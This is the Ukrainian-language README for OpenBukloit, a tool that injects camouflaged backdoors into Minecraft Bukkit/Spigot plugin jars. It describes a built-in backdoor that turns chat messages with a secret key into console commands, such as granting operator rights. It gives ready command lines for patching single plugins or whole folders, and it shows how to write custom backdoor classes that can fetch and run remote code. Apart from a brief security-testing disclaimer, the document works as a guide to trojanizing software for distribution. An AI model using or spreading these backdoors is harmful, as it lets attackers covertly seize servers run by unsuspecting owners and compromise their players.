<div align="center"><h1>OpenBukloit - Інжектор бекдорів для Minecraft плагінів</h1></div>

<div align="center"><img alt="Logo" src="../logo.png"/></div>

<div align="center">
    <a href="https://github.com/VoxelHax/OpenBukloit/issues"><img alt="Open issues" src="https://img.shields.io/github/issues-raw/VoxelHax/OpenBukloit"/></a>
    <a href="https://github.com/Voxelhax/OpenBukloit/releases/latest"><img alt="GitHub downloads" src="https://img.shields.io/github/downloads/VoxelHax/OpenBukloit/total"></a>
    <img alt="Code size" src="https://img.shields.io/github/languages/code-size/VoxelHax/OpenBukloit"/>
    <a href="https://www.codefactor.io/repository/github/voxelhax/openbukloit"><img alt="CodeFactor" src="https://www.codefactor.io/repository/github/voxelhax/openbukloit/badge"/></a>
    <a href="https://discord.gg/xtaktPTzYp"><img alt="Discord" src="https://img.shields.io/discord/928214827095175199"></a>
</div>

<div align="center">
    <a href="https://github.com/Voxelhax/OpenBukloit/releases/latest"><img alt="Download" src="https://img.shields.io/badge/-ЗАВАНТАЖИТИ_ОСТАНІЙ_РЕЛІЗ_(КЛІК)-blue?style=for-the-badge"/></a>
</div>

<br>

<hr>

**Мови: [English](../README.md), [Русский](README_RU.md), [Українська](README_UA.md)**

**OpenBukloit** — сучасний та потужний універсальний інжектор бекдорів, сумісний з усіма Bukkit/Spigot/Paper/і т.д. плагінами. Його особливістю є можливість інтеграції з будь-яким плагіном без необхідності щоразу модифікувати бекдор. Більш того, він забезпечує потужний двигун камуфляжу,
що робить практично неможливим його пошук без достатніх знань чи просунутих автоматизованих інструментів. OpenBukloit був розроблений для тестування систем безпеки серверів Minecraft. Команда VoxelHax не несе відповідальності за його неправомірне використання.

Це продовження проекту **[Bukloit](https://github.com/Rikonardo/Bukloit)**, в якому ми врахували всі проблеми попереднього проекту та використали зовсім інший підхід до розробки.

## Можливості OpenBukloit
- **Повна підтримка Bukkit та його форків на будь-якій версії Minecraft.**
- **Підтримка користувальницьких бекдорів.**
- **Автоматичне завантаження JDK, тому вам не потрібно дбати про сумісність версії Java.**
- **Потужний камуфляжний двигун, що ускладнює пошук бекдору у плагіні.**

## Встановлення
Для використання OpenBukloit у вас має бути встановлена будь-яка версія Java (але не нижче 8). Jar-файл OpenBukloit можна завантажити з [вкладки релізів](https://github.com/Voxelhax/OpenBukloit/releases/latest). OpenBukloit не вимагає жодних додаткових дій, просто помістіть файл jar кудись і використовуйте його з командного рядка.

## Використання
Щоб запустити OpenBukloit, відкрийте командний рядок у каталозі, де знаходиться jar-файл OpenBukloit та введіть:

```sh
java -jar OpenBukloit.jar
```

*Обов’язково вкажіть номер версії після назви OpenBukloit. Наприклад, якщо ви завантажили версію `OpenBukloit-1.0.12`, переконайтеся, що у команді ви використовуєте назву `OpenBukloit-1.0.12.jar`, а не просто `OpenBukloit.jar`*

Після імені файлу jar можна передати деякі аргументи для налаштування інжектора:

| Короткий аргумент | Довгий аргумент | Опис                                                                                                                                                                                  | Тип      |
|-------------------|-----------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------|
| -e                | --exploit       | Шлях до скомпільованого файлу .class або до похідного коду .java, який буде використовуватися як бекдор.<br />**За замовчуванням використовується вбудований бекдор.**                | Значення |
| -m                | --mode          | Режим Може бути одиночним/множинним.<br />**За замовчуванням: <ins>multiple</ins>.**<br />У множинному режимі змінює всі файли у зазначеній папці. В одиночному - лише вказаний файл. | Значення |
| -i                | --input         | Шлях до вхідної папки/файлу (залежить від режиму).<br />**За замовчуванням: <ins>in</ins> (<ins>in.jar</ins> якщо режим одиночний).**                                                 | Значення |
| -o                | --output        | Шлях до вихідної папки/файлу (залежить від режиму).<br />**За замовчуванням: <ins>out</ins> (<ins>out.jar</ins> якщо режим одиночний).**                                              | Значення |
| -r                | --replace       | Замінювати вихідний файл, якщо він вже існує.                                                                                                                                         | Флаг     |
|                   | --no-camouflage | Не застосовувати камуфляж (може бути корисним, якщо камуфляж не працює належним чином через обфускацію плагіна).                                                                      | Флаг     |
|                   | --class-name    | **Працює тільки з флагом `--no-camouflage`!** Задати кастомну назву для класа експлоїта (може включати назву пакета, наприклад: `com.voxelhax.OpenBukloitExploit`).                   | Значення |
|                   | --method-name   | **Працює тільки з флагом `--no-camouflage`!** Задати кастомну назву для метода `inject` у класі експлоїта.                                                                            | Значення |

Але цих аргументів недостатньо для запуску OpenBukloit. Ви також маєте вказати параметри бекдора. Оскільки OpenBukloit підтримує впровадження користувацьких бекдорів, ви повинні передати додаткові аргументи, які потрібні для бекдору.

## Вбудований експлоїт

За замовчанням OpenBukloit використовує вбудований бекдор. Це простий бекдор, який дозволяє виконувати будь-які команди з консолі, написавши спеціальне ключове слово перед командою в чаті.

Параметри вбудованого бекдору:

| Довгий аргумент | Опис                                                      |
|-----------------|-----------------------------------------------------------|
| --key           | Ключове слово, яке запускає виконання консольної команди. |

Використання у грі ключа, встановленого на значення "hackthisserver":

```
hackthisserver op MyName
```

Це повідомлення, відправлене в чат, буде виконане як консольна команда і дасть ОП гравцю MyName.

**Ось кілька прикладів використання OpenBukloit із вбудованим бекдором:**

1. Пропатчити всі .jar файли з ключем "#console" із папки "in" і зберегти їх у папку "out" без заміни.

```sh
java -jar OpenBukloit.jar -m multiple -i "in" -o "out" --key "#console"
```

2. Пропатчити всі файли з ключем "hacktheserver" з папки "in" і зберегти їх у папку "out" із заміною.

```sh
java -jar OpenBukloit.jar -m multiple -i "in" -o "out" --key "hacktheserver" -r
```

3. Пропатчити один файл "PluginName.jar" з ключем "#console" і зберегти його як файл "Output.jar" із заміною.

```sh
java -jar OpenBukloit.jar -m single -i "PluginName.jar" -o "Output.jar" --key "#console" -r
```

4. Пропатчити один файл "PluginName.jar" з ключем "#console" і зберегти його як файл "Output.jar" із заміною. Не застосовувати камуфляж і назвати клас експлоїта "com.voxelhax.OpenBukloitExploit".

```sh
java -jar OpenBukloit.jar -m single -i "PluginName.jar" -o "Output.jar" --key "#console" -r --no-camouflage --class-name "com.voxelhax.OpenBukloitExploit"
```

## Написання користувальницького експлоїту

Ви також можете написати власний бекдор. Це має бути клас із методом `public static void inject(JavaPlugin args)` (JavaPlugin з Bukkit API).

Ось простий приклад:

```java
import org.bukkit.plugin.java.JavaPlugin;

public class MyBackdoor {
    public static void inject(JavaPlugin args) {
        System.out.println("Hello, world!");
    }
}
```

Метод `inject` буде виконаний після методу `onEnable` плагіна. Ви можете робити тут все, що ви хочете, включаючи завантаження та запуск довільного коду з Інтернету.

Але ви повинні знати, що є деякі обмеження:
- В даний час ви не можете використовувати вкладені класи, у файлі експлоїту має бути лише один клас.
- Ви не повинні посилатися на свій клас експлоїту всередині нього, наприклад, використовувати його як параметри методу, як значення, що повертається, або як тип поля.

Ви можете використовувати зовнішні параметри з командного рядка, використовуючи %placeholders%, вони будуть підставлені в процесі інжекта:
Ось простий приклад:

```java
import org.bukkit.plugin.java.JavaPlugin;

public class MyBackdoor {
    public static void inject(JavaPlugin args) {
        System.out.println("Hello, %name%!");
    }
}
```

Потім ви можете заінжектити бекдор за допомогою команди:

```sh
java -jar OpenBukloit.jar -e MyBackdoor.java --name world
```

Зверніть увагу, що ми можемо передати наш бекдор OpenBukloit без компіляції, і він автоматично скомпілює його з наявністю API Spigot в пулі класів під час компіляції.
